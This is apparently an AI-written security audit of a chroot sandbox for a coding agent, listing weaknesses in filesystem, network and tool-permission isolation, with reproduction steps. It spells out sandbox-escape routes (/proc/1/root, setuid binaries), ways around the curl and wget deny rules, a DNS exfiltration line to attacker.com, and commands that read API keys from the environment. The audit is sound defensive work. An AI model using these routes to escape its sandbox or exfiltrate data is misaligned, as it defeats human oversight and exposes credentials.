# Security Audit: Claude Chroot Isolation Implementation

**Audit Date**: 2026-02-11
**Auditor**: Claude (Opus 4.5)
**Scope**: `scripts/claude-chroot-*.sh`, `docs/claude-chroot-setup.md`
**Classification**: Internal Security Review

---

## Executive Summary

This implementation attempts to create a sandboxed environment for Claude Code using chroot, nftables network filtering, and managed settings. While it demonstrates security-conscious thinking, **it has fundamental architectural weaknesses that prevent it from achieving meaningful isolation**.

**Overall Assessment**: NOT SUITABLE for untrusted workloads. May provide value as a "speed bump" for accidental mistakes but offers no protection against intentional escape.

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 4 |
| Medium | 4 |
| Low | 4 |

---

## Critical Findings

### CVE-CLASS-001: Chroot is Not a Security Boundary

**Severity**: CRITICAL
**Location**: Architectural design
**CVSS Base Score**: 9.8 (if used as security boundary)

**Description**: The implementation treats chroot as a security isolation mechanism. Chroot was designed for build environments and testing, not security isolation. It provides no protection against a process with:
- CAP_SYS_CHROOT capability
- Access to /proc, /dev, or /sys
- Ability to create device nodes
- ptrace capabilities

**Evidence** (`claude-chroot-enter.sh:152-154`):
```bash
mount_if_needed /dev "$CHROOT_DIR/dev" bind
mount_if_needed /proc "$CHROOT_DIR/proc" bind
mount_if_needed /sys "$CHROOT_DIR/sys" bind
```

**Exploitation Vectors**:
1. `/proc/1/root` provides reference to real root filesystem
2. `/dev` access enables device node creation/manipulation
3. `/sys` provides kernel parameter interfaces
4. `mknod` can create arbitrary device nodes

**Recommendation**: Replace with proper containerization:
- Linux namespaces (user, mount, network, PID, IPC)
- Seccomp-bpf syscall filtering
- Cgroups for resource limits
- Consider: bubblewrap, podman, or systemd-nspawn

---

### CVE-CLASS-002: UID-Based Network Filtering Bypass

**Severity**: CRITICAL
**Location**: `claude-chroot-enter.sh:192`
**CVSS Base Score**: 8.6

**Description**: Network filtering relies on UID matching, which is trivially bypassed.

**Evidence**:
```bash
meta skuid != $CHROOT_UID accept
```

**Exploitation Vectors**:

1. **UID Collision**: Host user with UID 1000 shares filter rules
2. **Setuid Binary Execution**: Any setuid binary runs as different UID, bypassing filter entirely
3. **Nix Store Manipulation**: The `/nix` mount is read-write, allowing potential installation of setuid binaries

**Evidence of RW Nix mount** (`claude-chroot-enter.sh:158-160`):
```bash
if [[ -d /nix ]]; then
    mount_if_needed /nix "$CHROOT_DIR/nix" bind  # No 'ro' flag
fi
```

**Recommendation**:
- Use network namespaces instead of UID filtering
- Mount /nix read-only with overlay for writes
- Use `unshare --net` for all network modes

---

## High Findings

### HIGH-001: DNS Exfiltration Channel

**Severity**: HIGH
**Location**: `claude-chroot-enter.sh:195-196`
**CVSS Base Score**: 7.5

**Description**: DNS traffic is unrestricted, enabling data exfiltration.

**Evidence**:
```bash
# Allow DNS (needed for API hostname resolution)
udp dport 53 accept
tcp dport 53 accept
```

**Exploitation**:
- Encode arbitrary data in DNS queries to attacker-controlled domains
- Use DNS tunneling tools (iodine, dnscat2)
- Exfiltrate via TXT record queries
- Typical bandwidth: 10-50 KB/s, sufficient for credentials/code

**Recommendation**:
- Run local DNS resolver that only answers for allowed domains
- Use DNS-over-HTTPS to a controlled endpoint
- Block all external DNS; use /etc/hosts for allowed domains

---

### HIGH-002: IP Allowlist TOCTOU Vulnerability

**Severity**: HIGH
**Location**: `claude-chroot-sync-ips.sh`, `claude-chroot-enter.sh:28-46`
**CVSS Base Score**: 7.4

**Description**: IP addresses are resolved at script execution time but cloud infrastructure IPs rotate continuously.

**Problems**:
1. DNS resolution occurs before firewall rules are applied (TOCTOU)
2. Cloud providers (likely used by Anthropic) rotate IPs frequently
3. CDN edge nodes vary by geography and load
4. DNS cache poisoning could inject attacker IPs

**Evidence** (`claude-chroot-enter.sh:38-45`):
```bash
ALLOWED_IPS=$(dig +short \
    api.anthropic.com \
    console.anthropic.com \
    ...
    A 2>/dev/null | grep -E '^[0-9]+\.' | sort -u | tr '\n' ' ' || echo "")
```

**Recommendation**:
- Use domain-based filtering (layer 7 proxy)
- Implement transparent HTTPS proxy with domain allowlist
- Accept that IP-based filtering cannot reliably restrict to specific services

---

### HIGH-003: Nix Sandbox Disabled

**Severity**: HIGH
**Location**: `claude-chroot-setup.sh:60-63`
**CVSS Base Score**: 7.2

**Description**: Nix build sandboxing is explicitly disabled, and unfree packages are allowed.

**Evidence**:
```bash
cat > "$CHROOT_DIR/etc/nix/nix.conf" << EOF
build-users-group =
sandbox = false
experimental-features = nix-command flakes
EOF
```

And in `shell.nix`:
```nix
config = { allowUnfree = true; }
```

**Impact**: Nix builds can access the network and filesystem without restriction. Combined with `cache.nixos.org` access, arbitrary package installation is possible.

**Recommendation**:
- Enable Nix sandbox: `sandbox = true`
- Restrict to specific package set
- Pre-build required packages; disable network for builds inside chroot

---

### HIGH-004: Managed Settings Only Block Tool Layer

**Severity**: HIGH
**Location**: `scripts/claude-chroot-managed-settings.json`
**CVSS Base Score**: 7.0

**Description**: The managed settings restrict Claude Code's *tool invocations*, not actual binary execution.

**Evidence**:
```json
"Bash(curl:*)",
"Bash(wget:*)",
```

**Bypass Methods**:
1. Write a Python script using `urllib`/`requests`
2. Write shell script, make executable, run via `./script.sh`
3. Use language-native HTTP clients (Node's `fetch`, Go's `net/http`)
4. Invoke binaries with path: `/run/current-system/sw/bin/curl`

**Recommendation**: This is defense-in-depth only. Actual network restriction must occur at OS level (which this implementation attempts but fails at).

---

## Medium Findings

### MED-001: Credential Exposure via Config Sync

**Severity**: MEDIUM
**Location**: `claude-chroot-enter.sh:97-102`

**Description**: Full Claude configuration directory is copied into chroot.

**Evidence**:
```bash
if [[ -d "$REAL_HOME/.claude" ]]; then
    cp -r "$REAL_HOME/.claude/"* "$CHROOT_DIR/home/$CHROOT_USER/.claude/"
```

**Impact**: API keys, OAuth tokens, and session data are exposed if chroot is compromised.

**Recommendation**:
- Copy only necessary config files
- Use ephemeral tokens where possible
- Consider bind-mounting read-only

---

### MED-002: Escape Hatch Flag Exists

**Severity**: MEDIUM
**Location**: `claude-chroot-enter.sh:73-76`

**Description**: `--full-network` flag defeats all network restrictions.

**Evidence**:
```bash
--full-network)
    NETWORK_MODE="full"
```

**Impact**: Users will use this "for convenience," normalizing unrestricted access.

**Recommendation**: Remove this flag entirely, or require explicit confirmation file.

---

### MED-003: Lazy Unmount Allows Persistence

**Severity**: MEDIUM
**Location**: `claude-chroot-cleanup.sh:36-38`

**Description**: Lazy unmounts keep mounts active until file handles close.

**Evidence**:
```bash
elif umount -l "$target" 2>/dev/null; then
    echo "  Lazy unmounted $mount_point (was busy)"
```

**Impact**: Malicious process can hold file handles to maintain access after "cleanup."

**Recommendation**:
- Kill all processes in chroot before unmount
- Use `fuser -k` to force-close handles
- Implement timeout before lazy unmount

---

### MED-004: No Syscall Filtering

**Severity**: MEDIUM
**Location**: Architectural gap

**Description**: No seccomp-bpf filtering restricts available syscalls.

**Impact**:
- Raw socket creation bypasses nftables
- ptrace allows process manipulation
- Kernel exploit surface is full

**Recommendation**: Apply seccomp profile restricting to necessary syscalls.

---

## Low Findings

### LOW-001: Hardcoded UID Without Verification

**Severity**: LOW
**Location**: `claude-chroot-setup.sh:6`, `claude-chroot-enter.sh:5`

```bash
CLAUDE_UID=1000
```

**Impact**: UID collision with existing host users causes permission confusion and potential filter bypass.

**Recommendation**: Dynamically allocate UID or verify 1000 is unused.

---

### LOW-002: API Key in Process Environment

**Severity**: LOW
**Location**: `claude-chroot-enter.sh:256`

```bash
${ANTHROPIC_API_KEY:+ANTHROPIC_API_KEY="$ANTHROPIC_API_KEY"}
```

**Impact**: Visible in `/proc/*/environ` to any process in chroot.

**Recommendation**: Use file-based secrets with restricted permissions.

---

### LOW-003: No Resource Limits

**Severity**: LOW
**Location**: Architectural gap

**Impact**: Fork bombs, memory exhaustion, disk filling via /tmp.

**Recommendation**: Apply cgroups limits or ulimits.

---

### LOW-004: Insufficient Input Validation in IP Sync

**Severity**: LOW
**Location**: `claude-chroot-sync-ips.sh:33`

```bash
ALLOWED_IPS=$(grep -v '^#' "$IP_FILE" | grep '=' | cut -d= -f2 | ...)
```

**Impact**: Malformed IP file could inject unexpected values into nftables rules.

**Recommendation**: Validate IP format before inclusion in firewall rules.

---

## Threat Model Analysis

### What This Implementation Actually Provides

| Stated Goal | Actual Protection |
|-------------|-------------------|
| "Full filesystem isolation" | Partial. /proc, /dev, /sys, /nix accessible |
| "Network restricted to Anthropic API" | Weak. DNS tunneling possible, IP rotation breaks allowlist |
| "Secure chroot environment" | Chroot is not a security boundary by design |
| "Claude Code tool restrictions" | Easily bypassed via scripts or language runtimes |

### Realistic Threat Assessment

**Protects Against**:
- Accidental network access from typos
- Casual exploration of host filesystem (outside mounted paths)
- Reminder to user that isolation is intended

**Does NOT Protect Against**:
- Malicious or compromised Claude instance
- Prompt injection attacks
- Deliberate escape attempts
- Data exfiltration via DNS
- Privilege escalation

---

## Recommendations Summary

### Immediate (Before Production Use)

1. **Do not use for security-critical workloads** - Document this limitation clearly
2. **Mount /nix read-only** - Use overlay for any necessary writes
3. **Enable Nix sandbox** - Set `sandbox = true`
4. **Remove --full-network flag** - Or require explicit opt-in file

### Short-Term

1. **Replace chroot with bubblewrap or podman**
2. **Implement network namespaces** - `unshare --net` with veth pairs
3. **Add seccomp filtering** - Restrict syscall surface
4. **Deploy DNS proxy** - Only resolve allowed domains

### Long-Term

1. **Consider VM-based isolation** - Firecracker, QEMU microVMs
2. **Implement proper secret management** - Vault, age, or similar
3. **Add resource limits** - cgroups v2 for CPU/memory/IO
4. **Audit logging** - Comprehensive logging of all actions

---

## Conclusion

This implementation represents a good-faith effort at isolation but relies on mechanisms (chroot, UID filtering) that cannot achieve the stated security goals. It may provide value as one layer in a defense-in-depth strategy, but **must not be relied upon as a security boundary**.

For actual isolation of untrusted code execution, use:
- Linux namespaces (all six types)
- Seccomp-bpf syscall filtering
- Cgroups resource limits
- Read-only root filesystem with tmpfs overlays
- Network namespaces with explicit allowlist proxies

---

## Appendix: References

- [Linux Programmer's Manual: chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html) - "This call does not change the current working directory, so that after the call '.' can be outside the tree rooted at '/'. In particular, the superuser can escape..."
- [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/) - Comprehensive treatment of Linux isolation primitives
- [Bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing tool
- [gVisor](https://gvisor.dev/) - Application kernel for container isolation
- [Firecracker](https://firecracker-microvm.github.io/) - MicroVM isolation

---

## Appendix B: Validation Scripts & Reproduction Instructions

A suite of validation scripts is provided in `scripts/chroot-validation/` to verify each finding.

### Running the Validation Suite

```bash
# 1. Set up the chroot (if not already done)
sudo sh scripts/claude-chroot-setup.sh

# 2. Enter the chroot with a workspace containing validation scripts
sudo sh scripts/claude-chroot-enter.sh /path/to/jetbrains-beads-manager

# 3. Inside chroot, run the full validation suite
sh /workspace/scripts/chroot-validation/10-full-validation-suite.sh

# 4. Or run individual tests
sh /workspace/scripts/chroot-validation/01-proc-escape-check.sh
```

### Validation Scripts

| Script | Finding | What It Tests |
|--------|---------|---------------|
| `01-proc-escape-check.sh` | CVE-CLASS-001 | /proc/1/root access to host filesystem |
| `02-dev-escape-check.sh` | CVE-CLASS-001 | Block device visibility, mknod capability |
| `03-dns-exfil-check.sh` | HIGH-001 | Arbitrary DNS resolution, tunneling potential |
| `04-uid-bypass-check.sh` | CVE-CLASS-002 | Setuid binaries, UID collision |
| `05-managed-settings-bypass.sh` | HIGH-004 | Script execution, language runtime HTTP |
| `06-nix-store-write-check.sh` | HIGH-003 | /nix writability, sandbox config |
| `07-sys-escape-check.sh` | CVE-CLASS-001 | /sys info disclosure |
| `08-credential-exposure-check.sh` | MED-001 | API keys in env, .claude contents |
| `09-no-resource-limits-check.sh` | LOW-003 | ulimits, cgroups |
| `10-full-validation-suite.sh` | All | Runs all tests, produces summary |

### Manual Reproduction Steps

#### CVE-CLASS-001: /proc Escape

```bash
# Inside chroot:
readlink /proc/1/root
# Expected: "/"

cat /proc/1/root/etc/hostname
# Expected: Shows HOST hostname (not chroot)

ls /proc/1/root/home/
# Expected: Shows HOST home directories
```

#### CVE-CLASS-002: UID Bypass

```bash
# Inside chroot:
find /nix/store /run -type f -perm -4000 2>/dev/null | head -5
# Expected: Shows setuid binaries

# These run as root, bypassing UID 1000 filter:
# ping, sudo, su, mount, etc.
```

#### HIGH-001: DNS Exfiltration

```bash
# Inside chroot:
dig example.com
# Expected: Resolves (DNS allowed to anywhere)

dig google.com
# Expected: Also resolves (no domain filtering)

# Data can be encoded in subdomains:
# dig $(echo "secret" | base32).attacker.com
```

#### HIGH-004: Managed Settings Bypass

```bash
# Inside chroot - these should be "blocked":
# But we can bypass:

echo '#!/bin/sh
curl -I https://example.com' > /tmp/fetch.sh
sh /tmp/fetch.sh
# Expected: Works despite "Bash(curl:*)" block

python3 -c "import urllib.request; print(urllib.request.urlopen('https://example.com').status)"
# Expected: Works (python not blocked at OS level)
```

#### MED-001: Credential Exposure

```bash
# Inside chroot:
env | grep -i key
# Expected: Shows ANTHROPIC_API_KEY

cat /proc/self/environ | tr '\0' '\n' | grep -i key
# Expected: Also visible here

ls ~/.claude/
# Expected: Contains synced config files
```

### Validation Checklist

Run inside chroot and check each box:

- [ ] `/proc/1/root` points to real "/" (not /srv/claude-chroot)
- [ ] Can read `/proc/1/root/etc/passwd` (host file)
- [ ] Block devices visible in `/dev/sd*` or `/dev/nvme*`
- [ ] `dig google.com` resolves (arbitrary DNS)
- [ ] Setuid binaries found in PATH
- [ ] Can create/execute scripts in /tmp
- [ ] Python urllib available for HTTP
- [ ] `/nix/store` is not read-only
- [ ] `sandbox = false` in /etc/nix/nix.conf
- [ ] Hardware info visible in /sys/class/dmi/id/
- [ ] API key visible in environment
- [ ] `ulimit -u` shows unlimited or high value

### Expected Results

If the chroot is configured as documented, **all tests should show VULNERABLE**.

A secure implementation would show:
- /proc not accessible or PID-namespaced
- /dev minimal (only null, zero, urandom)
- DNS queries blocked or filtered
- No setuid binaries
- Network namespace isolation
- Read-only /nix with overlay
- Proper resource limits

---

*This audit was performed by automated analysis. Findings should be validated by human security engineers before remediation decisions.*
